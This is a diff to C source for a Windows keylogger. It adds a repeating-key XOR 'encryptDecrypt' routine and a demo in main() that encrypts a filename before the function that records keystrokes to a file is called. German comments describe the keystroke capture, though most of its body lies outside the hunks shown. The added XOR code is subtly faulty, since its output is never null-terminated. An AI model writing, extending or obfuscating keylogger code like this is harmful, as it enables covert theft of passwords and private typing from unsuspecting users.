@@ -2,6 +2,15 @@
 #include <stdbool.h>
 #include <windows.h>
 
+void encryptDecrypt(char *input, char *output) {
+    char key[] = {'K', 'C', 'Q'}; //Can be any chars, and any size array
+
+    int i;
+    for(i = 0; i < strlen(input); i++) {
+        output[i] = input[i] ^ key[i % (sizeof(key)/sizeof(char))];
+    }
+}
+
 // Funktion zum Aufzeichnen der Tastatureingaben
 void logKeystrokes() {
     FILE *file;
@@ -92,12 +101,21 @@ void logKeystrokes() {
         Sleep(10); // Kurze Pause, um CPU-Last zu verringern
     }
 
-    // Schließen der Datei
+    // Schliessen der Datei
     fclose(file);
 }
 
 int main() {
     
+    char encrypt[] = "testlol.txt"; //The name of the file to encrypt
+    char decrypt[sizeof(encrypt)];
+    encryptDecrypt(encrypt, decrypt);
+    printf("Encrypted:%s\n",decrypt);
+    
+    char reEncrypt[sizeof(decrypt)];
+    encryptDecrypt(decrypt, reEncrypt);
+    printf("Decrypted:%s\n",reEncrypt);
+
     // Starten der Tastaturaufzeichnung
     logKeystrokes();
 
